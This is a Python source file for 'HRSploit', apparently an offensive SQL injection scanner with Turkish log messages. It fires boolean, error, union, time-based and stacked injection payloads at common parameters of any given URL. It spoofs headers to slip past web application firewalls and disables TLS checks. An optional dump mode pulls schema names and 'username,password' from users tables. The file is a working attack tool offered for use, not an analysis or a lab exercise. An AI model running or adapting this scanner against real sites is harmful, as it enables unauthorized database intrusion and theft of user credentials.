#!/usr/bin/env python3
"""HRSploit — SQLi Scanner Engine. Gerçek SQL injection tarama motoru."""
import sys, re, time, argparse, requests
from datetime import datetime

requests.packages.urllib3.disable_warnings()

TECHNIQUES = {
    "boolean":  ["' OR '1'='1' --","' OR 1=1 --","1' AND '1'='1","1 AND 1=1","1 AND 1=2"],
    "error":    ["'","''","' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
                 "' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,(SELECT "
                 "ifnull(cast(schema_name as char),0x20) FROM information_schema.schemata "
                 "LIMIT 0,1),0x7e))s), 8446744073709551610,8446744073709551610)))-- -",
                 "1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--"],
    "union":    ["' UNION SELECT NULL--","' UNION SELECT NULL,NULL--",
                 "' UNION SELECT NULL,NULL,NULL--",
                 "' UNION SELECT user(),version(),database()--",
                 "' UNION SELECT table_name,NULL FROM information_schema.tables--"],
    "time":     ["' AND SLEEP(3)--","1; SELECT SLEEP(3)--",
                 "'; SELECT pg_sleep(3)--","1 WAITFOR DELAY '0:0:3'--",
                 "1; DBMS_PIPE.RECEIVE_MESSAGE(('a'),3)--"],
    "stacked":  ["'; SELECT user()--","'; SHOW databases--",
                 "'; SELECT @@version--","'; SELECT current_user--"],
}
PARAMS  = ["id","user","uid","cat","page","product","item","search","q","data",
           "category","sort","order","filter","login","username","pass"]
DB_SIGS = {
    "MySQL":      ["mysql","you have an error in your sql","warning: mysql","1292"],
    "PostgreSQL": ["pg_","postgresql","warning: pg_exec","unterminated quoted"],
    "MSSQL":      ["microsoft","mssql","sql server","unclosed quotation","sqlserver"],
    "Oracle":     ["ora-","oracle","quoted string not properly terminated"],
    "SQLite":     ["sqlite","sqlite_master","no such column"],
}

def log(tag, msg):
    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    print(f"{ts} [{tag}] {msg}", flush=True)

def make_session(tamper=None, waf_bypass=True):
    s = requests.Session()
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 Chrome/124 Safari/537.36",
        "Accept": "*/*",
    })
    if waf_bypass:
        s.headers.update({"X-Forwarded-For":"127.0.0.1","X-Real-IP":"127.0.0.1"})
    s.verify = False
    return s

def detect_db(body):
    body_lower = body.lower()
    for db, sigs in DB_SIGS.items():
        if any(s in body_lower for s in sigs):
            return db
    return "Unknown"

def dump_db(session, target, param, technique_payload, db_type):
    log("DUMP", f"Veritabanı döküm başlıyor: {db_type}")
    dump_payloads = {
        "MySQL": [
            "' UNION SELECT schema_name,NULL FROM information_schema.schemata--",
            "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--",
            "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
            "' UNION SELECT username,password FROM users--",
        ],
        "PostgreSQL": [
            "'; SELECT datname FROM pg_database--",
            "'; SELECT table_name FROM information_schema.tables WHERE table_schema='public'--",
            "'; SELECT username,password FROM users--",
        ],
        "MSSQL": [
            "'; SELECT name FROM master.dbo.sysdatabases--",
            "'; SELECT name FROM sysobjects WHERE xtype='U'--",
            "'; SELECT username,password FROM users--",
        ],
    }
    payloads = dump_payloads.get(db_type, dump_payloads["MySQL"])
    findings = []
    for dp in payloads:
        try:
            r = session.get(target, params={param: dp}, timeout=10)
            if r.status_code == 200 and len(r.text) > 50:
                tables = re.findall(r"\b([a-z_]{3,30})\b", r.text.lower())
                if tables:
                    log("DUMP", f"  Bulunan: {', '.join(set(tables))[:120]}")
                    findings.extend(set(tables))
        except Exception as e:
            log("DUMP-ERR", str(e))
        time.sleep(0.5)
    return findings

def scan(target: str, dump: bool = False, dbms: str = None,
         tamper: str = None, batch: bool = False) -> list:
    log("SQLI", f"Tarama başlıyor: {target}")
    log("SQLI", f"Teknikler: boolean, error, union, time-based, stacked")
    log("SQLI", f"Parametre sayısı: {len(PARAMS)} | Dump: {dump}")

    session  = make_session(tamper=tamper)
    findings = []
    db_type  = dbms or "Unknown"

    for technique, payloads in TECHNIQUES.items():
        log("SQLI", f"Teknik: {technique.upper()} ({len(payloads)} payload)")
        for payload in payloads:
            for param in PARAMS:
                try:
                    t0 = time.time()
                    r  = session.get(target, params={param: payload}, timeout=12)
                    dt = time.time() - t0
                    body = r.text.lower()

                    # Time-based
                    if technique == "time" and dt >= 2.5:
                        log("SQLI-HIT",
                            f"🔴 TIME-BASED SQLi DOĞRULANDI! param={param} delay={dt:.2f}s")
                        log("SQLI-HIT", f"   Payload: {payload}")
                        db_type = db_type or detect_db(body) or "MySQL"
                        finding = {"type":"time-based","param":param,"payload":payload,
                                   "delay":dt,"db":db_type}
                        findings.append(finding)
                        if dump:
                            dump_results = dump_db(session, target, param, payload, db_type)
                            finding["dump"] = dump_results
                        break

                    # Error/Response based
                    detected_db = detect_db(body)
                    if detected_db != "Unknown":
                        log("SQLI-HIT",
                            f"🔴 {technique.upper()} SQLi! param={param} DB={detected_db}")
                        log("SQLI-HIT", f"   Payload: {payload}")
                        log("SQLI-HIT", f"   HTTP: {r.status_code} | {len(r.text)} byte")
                        db_type  = detected_db
                        finding  = {"type":technique,"param":param,"payload":payload,
                                    "db":db_type,"status":r.status_code}
                        findings.append(finding)
                        if dump:
                            dump_results = dump_db(session, target, param, payload, db_type)
                            finding["dump"] = dump_results
                        break

                    # Boolean length diff
                    if technique == "boolean":
                        r2 = session.get(target, params={param: "1 AND 1=2"}, timeout=8)
                        if abs(len(r.text) - len(r2.text)) > 50:
                            log("SQLI-HIT",
                                f"🔴 BOOLEAN SQLi (length diff)! param={param} "
                                f"diff={abs(len(r.text)-len(r2.text))}")
                            findings.append({"type":"boolean-blind","param":param,
                                             "payload":payload,"length_diff":abs(len(r.text)-len(r2.text))})
                            break

                    # POST da dene
                    r_post = session.post(target, data={param: payload}, timeout=10)
                    if detect_db(r_post.text.lower()) != "Unknown":
                        log("SQLI-HIT", f"🔴 SQLi (POST)! param={param}")
                        findings.append({"type":technique,"param":param,"method":"POST",
                                         "payload":payload,"db":detect_db(r_post.text.lower())})
                        break

                except Exception as e:
                    log("SQLI-WARN", f"  {param}={payload[:20]}: {e}")
                time.sleep(0.1)

    log("SQLI", f"Tarama tamamlandı — {len(findings)} açık bulundu — DB: {db_type}")
    return findings

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="HRSploit SQLi Scanner")
    parser.add_argument("-u","--url",    required=True)
    parser.add_argument("--dump",        action="store_true")
    parser.add_argument("--dbms",        default=None)
    parser.add_argument("--tamper",      default=None)
    parser.add_argument("--batch",       action="store_true")
    parser.add_argument("--threads",     type=int, default=5)
    args = parser.parse_args()
    results = scan(args.url, dump=args.dump, dbms=args.dbms,
                   tamper=args.tamper, batch=args.batch)
    for r in results:
        print(f"  FINDING: {r}")
